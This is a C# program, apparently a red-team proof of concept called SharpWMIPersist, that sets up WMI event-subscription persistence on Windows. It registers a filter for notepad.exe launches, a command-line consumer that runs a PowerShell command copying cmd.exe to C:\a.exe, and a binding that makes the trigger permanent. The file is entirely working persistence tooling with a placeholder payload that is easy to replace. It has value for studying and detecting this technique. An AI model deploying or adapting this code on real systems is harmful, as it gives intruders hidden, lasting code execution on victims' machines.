using System;
using System.Management;

namespace SharpWMIPersist
{
    class Program
    {
        public static void Main()
        {
            ManagementObject EventFilter = null;
            ManagementObject EventConsumer = null;
            ManagementObject Binding = null;
            ManagementScope scope = new ManagementScope("\\\\.\\root\\subscription");

            //EventFilter Creation
            ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
            WqlEventQuery wqlFilterQuery = new WqlEventQuery(@"SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance Isa 'Win32_Process' AND Targetinstance.Name = 'notepad.exe'");
            EventFilter = wmiEventFilter.CreateInstance();
            EventFilter["Name"] = "WMITestFilter";
            EventFilter["Query"] = wqlFilterQuery.QueryString;
            EventFilter["QueryLanguage"] = wqlFilterQuery.QueryLanguage;
            EventFilter["EventNameSpace"] = @"\root\cimv2";
            EventFilter.Put();
            Console.WriteLine("Filter created");

            //EventConsumer Creation
            ManagementClass wmiEventConsumer = new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"), null);
            EventConsumer = wmiEventConsumer.CreateInstance();
            EventConsumer["Name"] = "WMITestConsumer";
            EventConsumer["CommandLineTemplate"] = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe copy C:\\Windows\\System32\\cmd.exe C:\\a.exe";
            EventConsumer.Put();
            Console.WriteLine("Consumer created");

            //Binding Creation
            ManagementClass wmiBinding = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null);
            Binding = wmiBinding.CreateInstance();
            Binding["Filter"] = EventFilter.Path.RelativePath;
            Binding["Consumer"] = EventConsumer.Path.RelativePath;
            Binding.Put();
            Console.WriteLine("Binding created, Now persistent");
        }
    }
}
